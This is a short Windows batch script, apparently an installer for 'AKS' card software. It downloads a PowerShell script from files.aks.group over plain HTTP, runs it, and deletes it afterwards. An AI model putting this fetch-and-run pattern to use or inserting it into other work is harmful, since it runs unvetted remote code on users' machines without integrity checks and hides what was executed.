@echo off
set aks_path=%appdata%\AKS
mkdir %aks_path% > NUL 2>&1
cd %aks_path%

powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('http://files.aks.group/cardinstall.ps1', 'cardinstall.ps1')"
powershell.exe -executionpolicy RemoteSigned -file cardinstall.ps1
del cardinstall.ps1
